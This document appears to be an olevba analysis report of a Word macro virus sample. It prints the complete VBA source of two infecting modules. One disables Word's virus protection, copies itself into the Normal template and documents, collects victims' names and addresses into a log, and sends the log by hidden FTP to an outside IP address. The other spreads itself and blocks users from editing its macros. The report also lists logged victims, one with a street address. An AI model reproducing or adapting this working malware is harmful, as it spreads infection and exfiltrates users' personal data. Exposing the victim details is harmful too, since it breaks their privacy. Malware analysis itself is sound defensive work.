olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-7bab4f1418036311a222ce1d7515fc954dd418a7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq2-7bab4f1418036311a222ce1d7515fc954dd418a7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is another marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim AD, NT As Object
Dim OurCode, UserAddress, LogData, LogUploaded As String

'Initialize Variables
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
Set NT = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = AD.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = NT.CodeModule.Find(Marker, 1, 1, 10000, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = False) Then
  
    If DocumentInfected = True Then
      LogData = AD.CodeModule.Lines(1, AD.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = NT.CodeModule.Lines(1, NT.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    Randomize
    
    For I = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next I
    LogFile = "C:\hsfx" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = True
  ElseIf Day(Now()) <> 1 Then
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogUploaded") = False
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = AD.CodeModule.Lines(1, AD.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For I = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, I, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, I, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, I, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next I

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines
    NT.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = NT.CodeModule.Lines(1, NT.CodeModule.CountOfLines)

    AD.CodeModule.DeleteLines 1, AD.CodeModule.CountOfLines
    AD.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 10:19:17  - Freitag, 11 Dez 1998
' SPo0Ky
' Blue Planet
'



' 10:08:03  - Sunday, 13 Dec 1998
' Barnard
'



' 08:48:13  - Wednesday, 6 Jan 1999
' WRB
'



' 08:50:41 AM - Monday, 11 Jan 1999
' FRANK WALKER
'



' 02:47:39 PM - Thursday, 14 Jan 1999
' VPSL
'



' 08:01:39 PM - Saturday, 16 Jan 1999
' Sy Tran
' HYTEK Resources, Inc.
' 1016 Lansdale Ave
' Lansdale, PA  19446



' 06:44:39 PM - Monday, 1 Feb 1999
' bill
'



' 02:31:03 PM - Wednesday, 6 Jan 1999
' oasys
'



' 08:34:43 AM - Friday, 22 Jan 1999
' psp
'



' 10:26:14 AM - Monday, 1 Mar 1999
' WINTECK AUTOMATIONS
'



' 01:37:46 PM - Tuesday, 9 Mar 1999
' guest
'



' 06:07:43 PM - Monday, 22 Mar 1999
' VVE
'



' 09:50:44 AM - Thursday, 25 Mar 1999
' VVM
'



' 03:17:33 PM - Wednesday, 21 Apr 1999
' VVE
'



' 04:18:01 PM - Tuesday, 1 Jun 1999
' Suresh
'



' 04:41:33 AM - Monday, 21 Jun 1999
' Makesh Mytran
'



' 01:25:47 AM - Thursday, 24 Jun 1999
' internet-05
'



' 05:02:48 PM - Wednesday, 30 Jun 1999
' MainServer
'



' 10:33:00 PM - Sunday, 8 Aug 1999
' Indraneel
'



' 04:21:22 PM - Monday, 13 Sep 1999
' BHAVANA
'



' 12:52:20 PM - Wednesday, 8 Dec 1999
' shashank
'



' 03:02:35 PM - Thursday, 13 Apr 2000
' OPEY A.
' CNNHS B'92 PHILIPPINES (CNSC)



-------------------------------------------------------------------------------
VBA MACRO astia.bas 
in file: Virus.MSWord.Marker.fq2-7bab4f1418036311a222ce1d7515fc954dd418a7 - OLE stream: 'Macros/VBA/astia'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public AD As Object, aDes As Variant
Public NonTitasic As Boolean, afound As Boolean, hapus As Boolean, reset As Boolean, aExc As Boolean, DocCount As Boolean
Function AstMaster()
Dim nmak(1) As String
Dim NT As Object
Dim aSrc$
On Error GoTo selesai
nmak(0) = "astia"
nmak(1) = "TITASIC"

aSrc = MacroContainer
Set NT = NormalTemplate
If Not DocCount Then
Set AD = ActiveDocument
ElseIf aSrc <> "SNrml.dot" Then
aSrc = NT
End If

If aSrc = NT Then
aSrc = NT.FullName: Set aDes = AD
ElseIf aSrc = AD Then
aSrc = AD.FullName: Set aDes = NT
ElseIf aSrc = "SNrml.dot" Then
Set aDes = NT
aSrc = Options.DefaultFilePath(8) & "\SNrml.src"
End If

Mhapus aDes
With aDes.VBProject
If Not (Not hapus And .Description = "astia" And .VBComponents.Count > 2) Then
    Mcopy aSrc, aDes, nmak
    hapus = False
    .Description = "astia"
    If aDes = NT Then
        Options.SaveInterval = 1
        CustomizationContext = NT
        CommandBars("Tools").reset
        KeyBindings.Add KeyCode:=BuildKeyCode(77, 1024), KeyCategory:=1, _
        Command:="ToolsRecordMacroStart"
        aDes.Save
    End If
    CommandBars("Macro").Controls(2).OnAction = "ViewVbCode"
Else
GoTo Aksi
End If
End With
If afound = True Then Exit Function
Refresh
On Error Resume Next
Aksi:
If aExc = True Then Exit Function
Exit Function
selesai:
If Err.Number = 50289 Then MsgBox "Terimakasih Anda Telah" & Chr(13) & "Memproteksi Word dengan Aman", vbInformation, "Titasic"
End Function

Sub Mhapus(Sfile)
Dim nmak As Object
For Each nmak In Sfile.VBProject.VBComponents
    If nmak.Name = "NewMacros" Then NonTitasic = True
    If nmak.Name <> "ThisDocument" And nmak.Name <> "NewMacros" _
    And nmak.Name <> "astia" And nmak.Name <> "TITASIC" Then
        hapus = True
        If reset Then
        Application.OrganizerDelete Sfile.FullName, nmak.Name, 3
        Else
        nmak.CodeModule.DeleteLines 1, nmak.CodeModule.CountOfLines
        End If
    End If
Next nmak
End Sub
Sub Mcopy(Sfile, Dfile, nmak)
Dim aNmak
For Each aNmak In nmak
Application.OrganizerCopy Sfile, Dfile.FullName, aNmak, 3
Next
End Sub
Sub Action()
Documents.Add
On Error Resume Next
With ActiveWindow
.Caption = "Titasic"
.ActivePane.View.Zoom.Percentage = 100
.View.FullScreen = Not .View.FullScreen
.DisplayRulers = False
.DisplayHorizontalScrollBar = False
.DisplayVerticalRuler = False
.DisplayVerticalScrollBar = False
.View.ShowTextBoundaries = False
    CommandBars("Full Screen").Position = 1
    With CommandBars("Full Screen").Controls(1)
    .Caption = "Titasic," & "  " & Date
    .Style = 3
    .FaceId = 281
    End With
.View.Type = 6
Randomize
With ActiveDocument.Background.Fill
    .Visible = True
    .PresetGradient Int((6 - 1 + 1) * Rnd + 1), 1, Int((24 - 1 + 1) * Rnd + 1)
End With
TITASIC.Show
.View.FullScreen = Not .View.FullScreen
End With
CommandBars("Full Screen").reset
WBT
ActiveDocument.Close 0
WBF
End Sub
Sub FileOpen()
WBT
If Dialogs(80).Show <> 0 Then
WBF
AutoOpen
Else
WBF
End If
End Sub

Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
AstMaster
If Documents.Count > 1 Then
    For I = 1 To Documents.Count
    If Documents(I).Name <> ActiveDocument.Name Then
    Set AD = Documents(I)
    DocCount = True
    hapus = False
    AstMaster
    End If
    Next
End If
If Now > DateSerial(1998, 9, 10) Then Application.OnTime When:=Now + TimeValue("00:45:00"), Name:="astia.Action"
End
End Sub
Sub ViewVbCode()
If MsgBox("Maaf.." & Chr(13) & "Anda jangan coba-coba mengedit, merubah, ataupun menghapus makro Titasic..!!" & Chr(13) & Chr(13) _
& "Anda hanya bisa merekam makro, menyimpan, menggunakan" & Chr(13) & "serta menghapus makro buatan Anda" & Chr(13) & Chr(13) & " Apakah Anda ingin merekam makro..?", vbExclamation + vbYesNo, "Titasic") _
= vbYes Then SendKeys "%m%s{down}~%d'Macro non-Titasic'%m"
End Sub
Sub AutoExec()
On Error Resume Next
If MacroContainer <> NormalTemplate Then
aExc = True
AstMaster
WBT
AddIns.Unload False
WBF
End If
Application.EnableCancelKey = wdCancelDisabled
End Sub
Sub AutoExit()
Dim aAddin As Object
On Error GoTo batal
WBT
If Documents.Count <> 0 Then Documents.Close
Options.DefaultFilePath(2) = Options.DefaultFilePath(6)
afound = True
For Each aAddin In AddIns
    If aAddin.Name = "SNrml.dot" Then afound = False
Next aAddin
        
If afound = True Then
Application.Visible = False
Documents.Add
AstMaster
    With ActiveDocument
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\SNrml.src", FileFormat:=wdFormatDocument, AddToRecentFiles:=False
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\SNrml.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False
    End With
End If
Application.Quit
batal:
WBF
End Sub
Sub ToolsMacro()
WBF
On Error GoTo batal
Mhapus ActiveDocument
If NonTitasic Then
    If MacroContainer = ActiveDocument Then Application.Run NormalTemplate.VBProject.Name & ".astia.ToolsMacro": Exit Sub
    Application.DisplayAlerts = 0
        With Dialogs(215)
        .Description = "Macros Titasic mungkin tidak bisa Anda hapus, Anda hanya bisa menghapus makro buatan Anda (Descr: 'Makro non-Titasic')"
        If .Display = 1 Then .Execute
        End With
    Application.DisplayAlerts = -1
Else
ViewVbCode
End If
batal:
End Sub
Sub FileTemplates()
WBF
If Not reset Then Dialogs(87).Display
End Sub
Sub FormatStyle()
WBF
Dialogs(180).Show
End Sub
Function Refresh()
reset = True
FileTemplates
Mhapus aDes
End Function
Sub AutoClose()
Application.DisplayAlerts = -1
With Options
.SaveNormalPrompt = False
.SaveInterval = 10
.VirusProtection = False
End With
If ActiveWindow.Caption <> "Titasic" And InStr(1, ActiveDocument.Name, "Docume", 1) = 0 _
And ActiveDocument.Name <> "SNrml.dot" Then AstMaster
End Sub
Sub FileExit()
AutoExit
End Sub
Sub ToolsOptions()
Options.DefaultFilePath(wdUserTemplatesPath) = "C:\Program Files\Microsoft Office\Templates"
Dialogs(wdDialogToolsOptions).Show
Options.DefaultFilePath(wdUserTemplatesPath) = Application.Path
End Sub
Function WBT()
WordBasic.DisableAutoMacros True
End Function
Function WBF()
WordBasic.DisableAutoMacros False
End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

